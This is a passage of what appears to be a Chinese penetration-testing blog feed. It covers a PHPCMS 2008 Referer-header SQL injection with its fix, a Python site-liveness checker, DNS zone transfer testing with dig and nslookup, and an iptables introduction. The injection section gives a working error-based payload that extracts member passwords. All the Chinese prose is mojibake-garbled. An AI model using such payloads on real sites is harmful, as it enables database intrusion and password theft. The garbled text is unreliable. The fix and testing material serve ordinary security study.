<p>è¿™é‡Œ<code>$this-&gt;referrer</code>é€šè¿‡<code>this</code>æ–¹æ³•ç›´æ¥å°†HTTPè¯·æ±‚å¤´ä¸­çš„<code>referer</code>å­—æ®µæ’å…¥åˆ°æ•°æ®åº“ä¸­,æ²¡æœ‰åšä»»ä½•è¿‡æ»¤æªæ–½ã€‚(è¿™ä¸ªthisæ–¹æ³•æ˜¯PHPCMSé‡Œé¢ç›´æ¥å°è£…çš„)ã€‚</p>
<p>æ‰€ä»¥ç°åœ¨å·²ç»æ‰¾åˆ°æ¼æ´ç‚¹ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯æ‰¾åŒ…å«æ¼æ´çš„ç”¨æˆ·å¯æ§çš„é¡µé¢ã€‚å¦‚æœæ¼æ´æ˜¯ç”¨æˆ·ä¸å¯æ§çš„ï¼Œæ¯”å¦‚åªèƒ½ç®¡ç†å‘˜åˆ©ç”¨ï¼Œé‚£å°±ç›¸å½“çš„é¸¡è‚‹äº†ã€‚</p>
<p>è¿™é‡Œä½¿ç”¨<code>å›æº¯</code>çš„æ–¹æ³•ï¼Œçœ‹çœ‹å“ªäº›é¡µé¢è°ƒç”¨äº†å®ƒã€‚</p>
<p>é¡µé¢<code>/ads/include/commom.inc.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">...</div><div class="line">require MOD_ROOT.&apos;include/ads_place.class.php&apos;;</div><div class="line">require MOD_ROOT.&apos;include/ads.class.php&apos;;</div><div class="line">...</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>åœ¨å¾€ä¸Šçœ‹çœ‹è°è°ƒç”¨äº†<code>/ads/include/commom.inc.php</code></p>
<p><code>/ads/ad.php</code>æ–‡ä»¶ä¸­</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">...</div><div class="line">require &apos;./include/common.inc.php&apos;;</div><div class="line">...</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><code>ad.php</code>æ–‡ä»¶ä¸ºç”¨æˆ·å¯æ§æ–‡ä»¶ï¼Œä½†<code>ad.php</code>æœ‰æ—¶ä¸èƒ½è®¿é—®ï¼Œç»§ç»­å‘ä¸ŠæŸ¥æ‰¾<code>/data/js.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">chdir(â€˜../ads/â€™);</div><div class="line">require â€˜./ad.phpâ€™;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>åœ¨ç”¨æˆ·è®¿é—®é¦–é¡µæ—¶ï¼Œä¼šè°ƒç”¨<code>js.php</code>ï¼Œé€šè¿‡è¯¥æ–‡ä»¶å¯ä»¥æäº¤æœ‰å®³å­—æ®µï¼Œç„¶åé€šè¿‡é€å±‚è°ƒç”¨ï¼Œä¼ å…¥å­—æ®µ<code>referer</code>åˆ°å±é™©æ–¹æ³•<code>show</code>ï¼Œå¼•å…¥SQLæ³¨å…¥æ”»å‡»ã€‚</p>
<h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02 æ¼æ´åˆ©ç”¨"></a>0x02 æ¼æ´åˆ©ç”¨</h1><p>ä¿®æ”¹è¯·æ±‚å¤´ä¸­çš„<code>referer</code>å­—æ®µçš„è¯æœ‰å¾ˆå¤šç§ï¼Œæ¯”å¦‚burpsuiteï¼ŒTamper Dataâ€¦</p>
<p>è¿™é‡Œç›´æ¥ä½¿ç”¨ç«ç‹çš„Tamper Dataè¿›è¡Œä¿®æ”¹ï¼š</p>
<p>ç‚¹å‡»Start Tamper,ç„¶åè®¿é—®<code>http://your-addr/data/js.php?id=1</code></p>
<p>è¿™æ—¶å€™Tamper Dataä¼šè·³å‡ºæ¥,åœ¨å³è¾¹æ¡†å†…ï¼Œç‚¹å‡»å³é”®ï¼Œæ·»åŠ ä¸€ä¸ª<code>element</code>å€¼å¡«å†™payload</p>
<pre><code>referer=1â€™, (SELECT 1 FROM (select count(*), concat(floor(rand(0)*2),char(45,45,45),(SELECT password from phpcms_member limit 1))a from information_schema.tables group by a)b), â€˜0â€™)#
</code></pre><p>è¿™é‡Œæˆ‘è§£é‡Šä¸€ä¸‹ï¼šå› ä¸ºæ¼æ´çš„sqlè¯­å¥æ˜¯<code>INSERT</code>æ˜¯ä¸å›æ˜¾çš„ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ç›²æ³¨ï¼Œè¿™é‡Œçš„payloadä½¿ç”¨çš„<code>floor</code>æŠ¥é”™æ³¨å…¥ã€‚flooræŠ¥é”™æ³¨å…¥åŸç†è¯·å‚è€ƒï¼š<a href="http://byd.dropsec.xyz/2016/08/02/Mysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">floorå‡½æ•°ç”¨æ³•</a></p>
<p>æŠŠè¿™ä¸ªpayloadå¸¦å…¥sqlè¯­å¥ä¸­æ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$this-&gt;db-&gt;query(â€œINSERT INTO$this-&gt;stat_table(`adsid`,`username`,`ip`,`referer`,`clicktime`,`type`)VALUES (â€˜$ads[adsid]â€™,â€™$_usernameâ€™,â€™$ipâ€™,â€˜1â€™,â€˜$timeâ€™,(SELECT 1 FROM (select count(*), concat(floor(rand(0)*2),char(45,45,45),(SELECT password from phpcms_member limit 1))a from information_schema.tables group by a)b), â€˜0â€™)#,â€™0â€™)â€);</div></pre></td></tr></table></figure>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/phpcms_ad_sql_injection2.png" alt=""></p>
<h1 id="0x03-æ¼æ´ä¿®å¤"><a href="#0x03-æ¼æ´ä¿®å¤" class="headerlink" title="0x03 æ¼æ´ä¿®å¤"></a>0x03 æ¼æ´ä¿®å¤</h1><p>å¯¹ç›¸å…³å­—æ®µè¿›è¡Œè¿‡æ»¤å¤„ç†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$referer = safe_replace($this-&gt;referer);</div><div class="line">	$this-&gt;db-&gt;query(&quot;INSERT INTO $this-&gt;stat_table (`adsid`, `username`, `ip`, `referer`, `clicktime`, `type`) VALUES (&apos;$ads[adsid]&apos;, &apos;$_username&apos;, &apos;$ip&apos;, &apos;$referer&apos;, &apos;$time&apos;, &apos;0&apos;)&quot;);</div><div class="line">$template = $ads[&apos;template&apos;] ? $ads[&apos;template&apos;] : &apos;ads&apos;;</div></pre></td></tr></table></figure>
<p>è¿™é‡Œ<code>safe_replace</code>æ˜¯PHPCMS2008å°è£…çš„è¿‡æ»¤å‡½æ•°ã€‚</p>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pythonå®ç°æ‰¹é‡ç½‘ç«™å­˜æ´»æ£€æµ‹]]></title>
      <url>/2016/09/21/Python%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E7%BD%91%E7%AB%99%E5%AD%98%E6%B4%BB%E6%A3%80%E6%B5%8B/</url>
      <content type="html"><![CDATA[<p>åšæ¸—é€æµ‹è¯•çš„æ—¶å€™ï¼Œæœ‰ä¸ªæ¯”è¾ƒå¤§çš„é¡¹ç›®ï¼Œé‡Œé¢æœ‰å‡ ç™¾ä¸ªç½‘ç«™ï¼Œè¿™æ ·ä½ å¿…é¡»é¦–å…ˆç¡®å®šå“ªäº›ç½‘ç«™æ˜¯æ­£å¸¸ï¼Œå“ªäº›ç½‘ç«™æ˜¯ä¸æ­£å¸¸çš„ã€‚æ‰€ä»¥è‡ªå·±å°±ç¼–äº†ä¸€ä¸ªå°è„šæœ¬ï¼Œä¸ºä»¥åæ–¹ä¾¿ä½¿ç”¨ã€‚</p>
<a id="more"></a>
<p>å…·ä½“å®ç°çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">&apos;&apos;&apos;</div><div class="line">@Authorï¼šw2n1ck</div><div class="line">@åšå®¢ï¼šhttp://byd.dropsec.xyz/</div><div class="line">&apos;&apos;&apos;</div><div class="line"></div><div class="line">import requests</div><div class="line">import sys</div><div class="line">f = open(&apos;url.txt&apos;, &apos;r&apos;)</div><div class="line">url = f.readlines()</div><div class="line">length = len(url)</div><div class="line">url_result_success=[]</div><div class="line">url_result_failed=[]</div><div class="line">for i in range(0,length):</div><div class="line">    try:</div><div class="line">        response = requests.get(url[i].strip(), verify=False, allow_redirects=True, timeout=5)</div><div class="line">        if response.status_code != 200:</div><div class="line">            raise requests.RequestException(u&quot;Status code error: &#123;&#125;&quot;.format(response.status_code))</div><div class="line">    except requests.RequestException as e:</div><div class="line">        url_result_failed.append(url[i])</div><div class="line">        continue</div><div class="line">    url_result_success.append(url[i])</div><div class="line">f.close()</div><div class="line">result_len = len(url_result_success)</div><div class="line">for i in range(0,result_len):</div><div class="line">    print &apos;ç½‘å€%s&apos; % url_result_success[i].strip()+&apos;æ‰“å¼€æˆåŠŸ&apos;</div></pre></td></tr></table></figure>
<p>æµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%AD%98%E6%B4%BB.png" alt=""></p>
<p><strong>é‡åˆ°çš„é—®é¢˜ï¼š</strong></p>
<p>åˆšå¼€å§‹æµ‹è¯•çš„æ—¶å€™ï¼Œé‡åˆ°åªè¦æ˜¯ä¸èƒ½é”™è¯¯ï¼Œæˆ–è€…ä¸å­˜åœ¨çš„ï¼Œç›´æ¥æŠ¥é”™åœæ­¢ç¨‹åºã€‚åæ¥å‘ç°æ˜¯å› ä¸º<code>response.status_code != 200</code>è¿™é‡Œå–çŠ¶æ€ç çš„æ—¶å€™é”™è¯¯ã€‚</p>
<p>å› ä¸ºæœ‰çš„ç½‘ç«™ä¸èƒ½æ‰“å¼€çš„è¯ï¼Œä¸ä¼šè¿”å›çŠ¶æ€ç ã€‚æ‰€ä»¥ç¨‹åºå°±ä¸çŸ¥é“<code>ï¼==200</code>æ€ä¹ˆå¤„ç†äº†ã€‚</p>
<p><strong>è§£å†³æ–¹æ³•ï¼š</strong></p>
<p>ä½¿ç”¨<code>try except elseæ•æ‰å¼‚å¸¸</code></p>
<p>å…·ä½“ä»£ç ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">try:</div><div class="line">        response = requests.get(url[i].strip(), verify=False, allow_redirects=True, timeout=5)</div><div class="line">        if response.status_code != 200:</div><div class="line">            raise requests.RequestException(u&quot;Status code error: &#123;&#125;&quot;.format(response.status_code))</div><div class="line">    except requests.RequestException as e:</div><div class="line">        url_result_failed.append(url[i])</div><div class="line">        continue</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> Python </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[DNSåŸŸä¼ é€æ¼æ´]]></title>
      <url>/2016/09/20/DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<p>DNSæ˜¯ç½‘ç»œä¸­åº”ç”¨éå¸¸å¹¿æ³›çš„æœåŠ¡ä¹‹ä¸€ï¼Œæ˜¯ä¸€ç§åº•å±‚çš„ç½‘ç»œåŸºç¡€æœåŠ¡ã€‚å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯æä¾›åŸŸåï¼ˆå¦‚baidu.comï¼‰å’ŒIPç›´æ¥è§£æå…³ç³»çš„åŠŸèƒ½ï¼Œåªè¦æˆ‘ä»¬çš„ç½‘ç»œé€šä¿¡ä¸­å­˜åœ¨åŸŸåï¼Œå°±ä¼šæ¶‰åŠåˆ°DNSæœåŠ¡ã€‚<br><a id="more"></a><br>DNSåŒºåŸŸä¼ é€ï¼ˆDNS zone transferï¼‰æŒ‡çš„æ˜¯ä¸€å°å¤‡ç”¨æœåŠ¡å™¨ä½¿ç”¨æ¥è‡ªä¸»æœåŠ¡å™¨çš„æ•°æ®åˆ·æ–°è‡ªå·±çš„åŸŸï¼ˆzoneï¼‰æ•°æ®åº“ã€‚è¿™ä¸ºè¿è¡Œä¸­çš„DNSæœåŠ¡æä¾›äº†ä¸€å®šçš„å†—ä½™åº¦ï¼Œå…¶ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢ä¸»çš„åŸŸåæœåŠ¡å™¨å› æ„å¤–æ•…éšœå˜å¾—ä¸å¯ç”¨æ—¶å½±å“åˆ°æ•´ä¸ªåŸŸåçš„è§£æã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒDNSåŒºåŸŸä¼ é€æ“ä½œåªåœ¨ç½‘ç»œé‡ŒçœŸçš„æœ‰å¤‡ç”¨åŸŸåDNSæœåŠ¡å™¨æ—¶æ‰æœ‰å¿…è¦ç”¨åˆ°ï¼Œä½†è®¸å¤šDNSæœåŠ¡å™¨å´è¢«é”™è¯¯åœ°é…ç½®æˆåªè¦æœ‰clientå‘å‡ºè¯·æ±‚ï¼Œå°±ä¼šå‘å¯¹æ–¹æä¾›ä¸€ä¸ªzoneæ•°æ®åº“çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ‰€ä»¥è¯´å…è®¸ä¸å—ä¿¡ä»»çš„å› ç‰¹ç½‘ç”¨æˆ·æ‰§è¡ŒDNSåŒºåŸŸä¼ é€ï¼ˆzone transferï¼‰æ“ä½œæ˜¯åæœæœ€ä¸ºä¸¥é‡çš„é”™è¯¯é…ç½®ä¹‹ä¸€ã€‚</p>
<p>ç®€å•ç‚¹è¯´å°±æ˜¯DNSæœåŠ¡å™¨é…ç½®ä¸å½“ï¼Œå¯¼è‡´å¯ä»¥å°†è¯¥DNSæœåŠ¡å™¨ä¸Šçš„æ•°æ®ä¼ é€åˆ°å…¶ä»–çš„ä¸»æœºä¸Šã€‚æ¶æ„æ”»å‡»è€…å¯ä»¥é€šè¿‡æ­¤ç§æ–¹æ³•ï¼Œè·å–æŸä¸ªåŸŸåçš„æ‰€æœ‰å­åŸŸååŠå¯¹åº”IPåœ°å€ã€‚</p>
<h1 id="æµ‹è¯•æ–¹æ³•"><a href="#æµ‹è¯•æ–¹æ³•" class="headerlink" title="æµ‹è¯•æ–¹æ³•"></a>æµ‹è¯•æ–¹æ³•</h1><h2 id="1ã€Linux-digæµ‹è¯•æ–¹æ³•"><a href="#1ã€Linux-digæµ‹è¯•æ–¹æ³•" class="headerlink" title="1ã€Linux digæµ‹è¯•æ–¹æ³•"></a>1ã€Linux digæµ‹è¯•æ–¹æ³•</h2><p>digæ˜¯Linuxä¸Šå¸¸ç”¨çš„dnså·¥å…·ï¼Œå¦‚æœæ²¡æœ‰æ­¤å‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å®‰è£…ï¼ˆCentosç³»ç»Ÿï¼‰ï¼š</p>
<blockquote>
<p>yum install bind-utils</p>
</blockquote>
<p>ä½¿ç”¨digè¿›è¡ŒDNSåŸŸä¼ é€ï¼Œé¦–å…ˆè¦æ‰¾åˆ°ä¸»æœºçš„SOAæˆ–è€…NSè®°å½•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">[root@user ~]# dig soa xxx.com</div><div class="line"> </div><div class="line">; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.23.rc1.el6_5.1 &lt;&lt;&gt;&gt; soa 3mc2.com</div><div class="line">;; global options: +cmd</div><div class="line">;; Got answer:</div><div class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 2865</div><div class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0</div><div class="line"> </div><div class="line">;; QUESTION SECTION:</div><div class="line">;3mc2.com.            IN    SOA</div><div class="line"> </div><div class="line">;; ANSWER SECTION:</div><div class="line">xxx.com.        600    IN    SOA    f1g1ns1.dnspod.net. freednsadmin.dnspod.com. 1411491105 3600 180 1209600 180</div><div class="line"> </div><div class="line">;; Query time: 504 msec</div><div class="line">;; SERVER: 223.5.5.5#53(223.5.5.5)</div><div class="line">;; WHEN: Wed Mar 11 11:26:05 2015</div><div class="line">;; MSG SIZE  rcvd: 100</div></pre></td></tr></table></figure>
<p>æ˜¾ç¤ºç»“æœå¿½ç•¥æ³¨é‡Šéƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°SOAè®°å½•æœ‰ä¸¤ä¸ªæœåŠ¡å™¨ï¼š<code>f1g1ns1.dnspod.net</code> å’Œ <code>freednsadmin.dnspod.com</code>ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹DNSæ˜¯å¦å­˜åœ¨DNSåŸŸä¼ é€æ¼æ´ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™å¯ä»¥æ‰¾åˆ°xxx.comçš„æ‰€æœ‰å­åŸŸåå’ŒIPå¯¹åº”å…³ç³»ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[root@user ~]# dig axfr xxx.com @f1g1ns1.dnspod.net</div><div class="line"> </div><div class="line">; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.23.rc1.el6_5.1 &lt;&lt;&gt;&gt; axfr xxx.com @f1g1ns1.dnspod.net</div><div class="line">;; global options: +cmd</div><div class="line">; Transfer failed.</div></pre></td></tr></table></figure>
<p>ä»¥ä¸Šæ˜¯ä¸èƒ½è¿›è¡ŒDNSåŸŸä¼ é€çš„ç»“æœï¼Œä¸‹å›¾æ˜¯å¯ä»¥è¿›è¡ŒDNSåŸŸä¼ é€çš„ç»“æœï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/DNS%E5%9F%9F%E4%BC%A0%E9%80%811.png" alt=""></p>
<h2 id="2ã€Windows-nslookupå‘½ä»¤"><a href="#2ã€Windows-nslookupå‘½ä»¤" class="headerlink" title="2ã€Windows nslookupå‘½ä»¤"></a>2ã€Windows nslookupå‘½ä»¤</h2><p>nslookupæ˜¯windowsä¸‹è‡ªå¸¦çš„DNSæµ‹è¯•å·¥å…·ï¼Œå¯ä»¥é€šè¿‡æ­¤å‘½ä»¤è¿›è¡ŒDNSåŸŸä¼ é€æµ‹è¯•ï¼š</p>
<p>ä¸»è¦æ–¹æ³•å’Œdigç±»ä¼¼ï¼Œå…ˆæ‰¾å‡ºnsæœåŠ¡å™¨ï¼Œç„¶åæ‰§è¡Œ<code>ls -d</code> åˆ—å‡ºå­åŸŸç­‰ä¿¡æ¯ï¼ˆä»¥ä¸‹æ˜¯ä¸èƒ½ä¼ é€çš„æƒ…å½¢ï¼‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">[c:\~]$ nslookup</div><div class="line">é»˜è®¤æœåŠ¡å™¨:  public1.alidns.com</div><div class="line">Address:  223.5.5.5</div><div class="line"> </div><div class="line">&gt; set type=ns</div><div class="line">&gt; xxx.com</div><div class="line">éæƒå¨åº”ç­”:</div><div class="line">æœåŠ¡å™¨:  public1.alidns.com</div><div class="line">Address:  223.5.5.5</div><div class="line"> </div><div class="line">xxx.com    nameserver = f1g1ns1.dnspod.net</div><div class="line">xxx.com    nameserver = f1g1ns2.dnspod.net</div><div class="line">&gt; server f1g1ns2.dnspod.net</div><div class="line">é»˜è®¤æœåŠ¡å™¨:  f1g1ns2.dnspod.net</div><div class="line">Addresses:  115.236.137.40</div><div class="line">      112.90.82.194</div><div class="line">      101.226.30.224</div><div class="line">      182.140.167.188</div><div class="line">&gt; set type=any</div><div class="line">&gt; ls -d 3mc2.com</div><div class="line">*** æ— æ³•åˆ—å‡ºåŸŸ xxx.com: BAD ERROR VALUE</div><div class="line">DNS æœåŠ¡å™¨æ‹’ç»å°†åŒºåŸŸ 3mc2.com ä¼ é€åˆ°æ‚¨çš„è®¡ç®—æœºã€‚å¦‚æœè¿™ä¸æ­£ç¡®ï¼Œ</div><div class="line">è¯·æ£€æŸ¥ IP åœ°å€ 223.5.5.5 çš„ DNS æœåŠ¡å™¨ä¸Š 3mc2.com çš„</div><div class="line">åŒºåŸŸä¼ é€å®‰å…¨è®¾ç½®ã€‚</div></pre></td></tr></table></figure>
<p>æ­£å¸¸å­˜åœ¨DNSåŸŸä¼ é€æ¼æ´çš„è¿”å›ç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/DNS%E5%9F%9F%E4%BC%A0%E9%80%812.png" alt=""></p>
<h2 id="3ã€ä½¿ç”¨dnsenum-plå’ŒDnswalkæµ‹è¯•ï¼š"><a href="#3ã€ä½¿ç”¨dnsenum-plå’ŒDnswalkæµ‹è¯•ï¼š" class="headerlink" title="3ã€ä½¿ç”¨dnsenum.plå’ŒDnswalkæµ‹è¯•ï¼š"></a>3ã€ä½¿ç”¨dnsenum.plå’ŒDnswalkæµ‹è¯•ï¼š</h2><p>ç°æˆå·¥å…·ï¼Œä¸åšä»‹ç»ï¼ŒKalié‡Œè¾¹æœ‰</p>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
            <tag> DNSåŸŸä¼ é€ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[IPtableså…¥é—¨æ•™ç¨‹]]></title>
      <url>/2016/09/03/IPtables%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/</url>
      <content type="html"><![CDATA[<h1 id="0x00-iptablesä»‹ç»"><a href="#0x00-iptablesä»‹ç»" class="headerlink" title="0x00 iptablesä»‹ç»"></a>0x00 iptablesä»‹ç»</h1><p><font color="#000ff">é˜²ç«å¢™ï¼Œå…¶å®è¯´ç™½äº†è®²ï¼Œå°±æ˜¯ç”¨äºå®ç°Linuxä¸‹è®¿é—®æ§åˆ¶çš„åŠŸèƒ½çš„ï¼Œå®ƒåˆ†ä¸ºç¡¬ä»¶çš„æˆ–è€…è½¯ä»¶çš„é˜²ç«å¢™ä¸¤ç§ã€‚æ— è®ºæ˜¯åœ¨å“ªä¸ªç½‘ç»œä¸­ï¼Œé˜²ç«å¢™å·¥ä½œçš„åœ°æ–¹ä¸€å®šæ˜¯åœ¨ç½‘ç»œçš„è¾¹ç¼˜ã€‚è€Œæˆ‘ä»¬çš„ä»»åŠ¡å°±æ˜¯éœ€è¦å»å®šä¹‰åˆ°åº•é˜²ç«å¢™å¦‚ä½•å·¥ä½œï¼Œè¿™å°±æ˜¯é˜²ç«å¢™çš„ç­–ç•¥ï¼Œè§„åˆ™ï¼Œä»¥è¾¾åˆ°è®©å®ƒå¯¹å‡ºå…¥ç½‘ç»œçš„IPã€æ•°æ®è¿›è¡Œæ£€æµ‹ã€‚</font><br><a id="more"></a></p>
<p>linuxçš„åŒ…è¿‡æ»¤åŠŸèƒ½ï¼Œå³linuxé˜²ç«å¢™ï¼Œå®ƒç”±<code>netfilter</code> å’Œ <code>iptables</code> ä¸¤ä¸ªç»„ä»¶ç»„æˆã€‚</p>
<p>netfilter ç»„ä»¶ä¹Ÿç§°ä¸ºå†…æ ¸ç©ºé—´ï¼Œæ˜¯å†…æ ¸çš„ä¸€éƒ¨åˆ†ï¼Œç”±ä¸€äº›ä¿¡æ¯åŒ…è¿‡æ»¤è¡¨ç»„æˆï¼Œè¿™äº›è¡¨åŒ…å«å†…æ ¸ç”¨æ¥æ§åˆ¶ä¿¡æ¯åŒ…è¿‡æ»¤å¤„ç†çš„è§„åˆ™é›†ã€‚</p>
<p>iptables ç»„ä»¶æ˜¯ä¸€ç§å·¥å…·ï¼Œä¹Ÿç§°ä¸ºç”¨æˆ·ç©ºé—´ï¼Œå®ƒä½¿æ’å…¥ã€ä¿®æ”¹å’Œé™¤å»ä¿¡æ¯åŒ…è¿‡æ»¤è¡¨ä¸­çš„è§„åˆ™å˜å¾—å®¹æ˜“ã€‚</p>
<h1 id="0x01-iptablesçš„ç»“æ„"><a href="#0x01-iptablesçš„ç»“æ„" class="headerlink" title="0x01 iptablesçš„ç»“æ„"></a>0x01 iptablesçš„ç»“æ„</h1><p>iptablesçš„ç»“æ„ï¼š</p>
<p>iptables -&gt; Tables -&gt; Chains -&gt; Rules<br>ç®€å•åœ°è®²ï¼Œtablesç”±chainsç»„æˆï¼Œè€Œchainsåˆç”±rulesç»„æˆã€‚iptables é»˜è®¤æœ‰å››ä¸ªè¡¨Filter, NAT, Mangle, Rawï¼Œå…¶å¯¹äºçš„é“¾å¦‚ä¸‹å›¾</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/iptables1.jpg" alt=""></p>
<h1 id="0x02-filterè¡¨è¯¦è§£"><a href="#0x02-filterè¡¨è¯¦è§£" class="headerlink" title="0x02 filterè¡¨è¯¦è§£"></a>0x02 filterè¡¨è¯¦è§£</h1><p><strong>1. åœ¨iptablesä¸­ï¼Œfilterè¡¨èµ·è¿‡æ»¤æ•°æ®åŒ…çš„åŠŸèƒ½ï¼Œå®ƒå…·æœ‰ä»¥ä¸‹ä¸‰ç§å†…å»ºé“¾ï¼š</strong></p>
<ol>
<li>INPUTé“¾ â€“ å¤„ç†æ¥è‡ªå¤–éƒ¨çš„æ•°æ®ã€‚ </li>
<li>OUTPUTé“¾ â€“ å¤„ç†å‘å¤–å‘é€çš„æ•°æ®ã€‚ </li>
<li>FORWARDé“¾ â€“ å°†æ•°æ®è½¬å‘åˆ°æœ¬æœºçš„å…¶ä»–ç½‘å¡è®¾å¤‡ä¸Šã€‚ </li>
</ol>
<p><strong>2. æ•°æ®æµå‘åœºæ™¯</strong></p>
<ol>
<li>è®¿é—®æœ¬æœºï¼šåœ¨INPUTé“¾ä¸Šåšè¿‡æ»¤</li>
<li>æœ¬æœºè®¿é—®å¤–éƒ¨ï¼šåœ¨OUTPUTé“¾ä¸Šåšè¿‡æ»¤</li>
<li>é€šè¿‡æœ¬æœºè®¿é—®å…¶ä»–ä¸»æœº:åœ¨FORWARDé“¾ä¸Šåšè¿‡æ»¤</li>
</ol>
<p><strong>3. IptablesåŸºæœ¬æ“ä½œ</strong></p>
<ol>
<li>å¯åŠ¨iptablesï¼šservice iptables start</li>
<li>å…³é—­iptablesï¼šservice iptables stop</li>
<li>é‡å¯iptablesï¼šservice iptables restart</li>
<li>æŸ¥çœ‹iptablesçŠ¶æ€ï¼šservice iptables status</li>
<li>ä¿å­˜iptablesé…ç½®ï¼šservice iptables save</li>
<li>IptablesæœåŠ¡é…ç½®æ–‡ä»¶ï¼š/etc/sysconfig/iptables-config</li>
<li>Iptablesè§„åˆ™ä¿å­˜æ–‡ä»¶ï¼š/etc/sysconfig/iptables</li>
<li>æ‰“å¼€iptablesè½¬å‘ï¼šecho â€œ1â€&gt; /proc/sys/net/ipv4/ip_forward</li>
</ol>
